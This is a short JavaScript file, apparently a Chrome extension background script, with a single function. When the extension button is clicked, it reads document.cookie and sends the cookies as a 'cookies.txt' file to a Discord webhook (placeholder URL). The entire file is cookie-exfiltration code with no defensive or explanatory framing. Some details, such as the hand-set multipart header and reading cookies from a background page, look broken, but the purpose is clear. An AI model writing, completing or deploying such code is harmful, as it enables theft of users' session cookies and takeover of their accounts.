function sendWebhookMessage() {
  const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";

  const cookies = document.cookie;

  const payload = {
    content: "Cookies:",
    file: {
      value: JSON.stringify(cookies, null, 2),
      options: {
        filename: "cookies.txt",
        contentType: "text/plain"
      }
    }
  };

  const xhr = new XMLHttpRequest();
  xhr.open("POST", webhookUrl, true);
  xhr.setRequestHeader("Content-Type", "multipart/form-data");

  const formData = new FormData();
  formData.append("payload_json", JSON.stringify(payload));

  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.log("Cookies sent to Discord webhook.");
      } else {
        console.error("Failed to send cookies to Discord webhook.");
      }
    }
  };

  xhr.send(formData);
}

chrome.browserAction.onClicked.addListener(sendWebhookMessage);
